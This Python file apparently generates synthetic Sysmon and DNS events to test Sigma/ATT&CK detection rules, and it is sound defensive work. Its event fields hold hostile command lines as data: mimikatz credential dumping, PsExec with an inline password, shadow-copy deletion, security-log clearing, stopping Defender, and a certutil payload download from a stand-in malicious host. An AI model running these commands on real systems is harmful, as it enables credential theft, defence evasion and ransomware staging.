"""8 种原子攻击样本（覆盖 8 个关键 Sigma/ATT&CK 规则）"""

import os


def attack_lsass_dump():
    """T1003.001 — LSASS 内存转储（凭据窃取）"""
    return {
        "source": "sysmon",
        "host": "WS-FINANCE-0142",
        "user": "zhang.wei@knorr-bremse.com",
        "event_type": "process.create",
        "severity": "high",
        "raw_data": {
            "process": {"name": "mimikatz.exe",
                       "command_line": "mimikatz.exe sekurlsa::logonpasswords",
                       "parent": "cmd.exe"},
        },
    }


def attack_psexec_lateral():
    """T1021.002 — PsExec 横向移动"""
    return {
        "source": "sysmon",
        "host": "WS-IT-0089",
        "user": "li.fang@knorr-bremse.com",
        "event_type": "process.create",
        "severity": "high",
        "raw_data": {
            "process": {"name": "psexec.exe",
                       "command_line": "psexec.exe \\\\FINANCE-WS01 -u admin -p p@ss cmd.exe"},
            "network": {"dsthost": "FINANCE-WS01", "dstport": 445},
        },
    }


def attack_shadow_delete():
    """T1490 — 阴影副本删除（勒索前兆）"""
    return {
        "source": "sysmon",
        "host": "WS-RD-0123",
        "user": "wang.lei@knorr-bremse.com",
        "event_type": "process.create",
        "severity": "high",
        "raw_data": {
            "process": {"name": "vssadmin.exe",
                       "command_line": "vssadmin delete shadows /all /quiet"},
        },
    }


def attack_log_clear():
    """T1070.001 — Windows 安全日志清除"""
    return {
        "source": "sysmon",
        "host": "WS-IT-0078",
        "user": "UNKNOWN",
        "event_type": "process.create",
        "severity": "high",
        "raw_data": {
            "process": {"command_line": "wevtutil cl Security"},
        },
    }


def attack_defender_disable():
    """T1562.001 — Defender 服务关闭"""
    return {
        "source": "sysmon",
        "host": "WS-DEV-0455",
        "user": "zhao.tao@knorr-bremse.com",
        "event_type": "service.modify",
        "severity": "high",
        "raw_data": {
            "process": {"command_line": "sc stop WinDefend"},
            "service": {"name": "WinDefend", "state": "stopped"},
        },
    }


def attack_certutil():
    """T1105 — Certutil LOLBIN 远程下载"""
    return {
        "source": "sysmon",
        "host": "WS-RD-0202",
        "user": "chen.gang@knorr-bremse.com",
        "event_type": "process.create",
        "severity": "medium",
        "raw_data": {
            "process": {"name": "certutil.exe",
                       "command_line": "certutil.exe -urlcache -split -f http://malicious.example.com/payload.exe payload.exe"},
        },
    }


def attack_dns_tunnel():
    """T1071.004 — DNS 隧道"""
    return {
        "source": "dns",
        "host": "WS-RD-0011",
        "user": "unknown",
        "event_type": "dns.query",
        "severity": "medium",
        "raw_data": {
            "dns": {"query_name": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.tk",
                    "query_volume_per_host_per_hour": 2500},
        },
    }


def attack_powershell_download():
    """T1059.001 — PowerShell 远程下载"""
    return {
        "source": "sysmon",
        "host": "WS-DEV-0099",
        "user": "yang.bing@knorr-bremse.com",
        "event_type": "process.create",
        "severity": "medium",
        "raw_data": {
            "process": {"name": "powershell.exe",
                       "command_line": "powershell.exe -EncodedCommand JABjAGEAPQBuAHMAZQBsAC4AVQBpAG4AZABvAHcAUwB0AGEAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="},
        },
    }


def attack_benign_admin():
    """合法管理员操作（不应触发规则 — 用于测试 false positive 抑制）"""
    return {
        "source": "sysmon",
        "host": "WS-IT-0099",
        "user": "admin@knorr-bremse.com",
        "event_type": "process.create",
        "severity": "low",
        "raw_data": {
            "process": {"name": "powershell.exe",
                       "command_line": "powershell.exe Get-Service WinDefend"},
        },
    }


ATTACK_MAP = {
    "lsass": attack_lsass_dump,
    "psexec": attack_psexec_lateral,
    "shadow": attack_shadow_delete,
    "logclear": attack_log_clear,
    "defender": attack_defender_disable,
    "certutil": attack_certutil,
    "dns": attack_dns_tunnel,
    "powershell": attack_powershell_download,
    "benign": attack_benign_admin,
}


def main():
    import sys
    print("# 8 种原子攻击样本（用于 Sigma/ATT&CK 规则验证）\n")
    for name, fn in ATTACK_MAP.items():
        event = fn()
        print(f"## {name}")
        print(f"- host: {event['host']}")
        print(f"- user: {event['user']}")
        print(f"- raw: {event['raw_data']}")
        print()


if __name__ == "__main__":
    main()